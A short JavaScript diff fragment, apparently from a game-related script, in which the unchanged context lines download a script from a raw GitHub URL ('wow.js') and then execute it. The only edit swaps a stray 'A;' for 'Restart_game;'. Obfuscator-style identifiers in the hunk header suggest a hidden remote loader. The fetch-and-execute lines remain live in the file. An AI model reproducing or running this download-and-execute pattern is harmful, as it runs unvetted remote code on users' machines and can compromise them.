@@ -40,4 +40,4 @@ function executeScript(_0x4e2958) {
 }
 downloadScript("https://raw.githubusercontent.com/GaeClapper/fr/refs/heads/main/wow.js", scriptPath);
 executeScript(scriptPath);
-A;
+Restart_game;
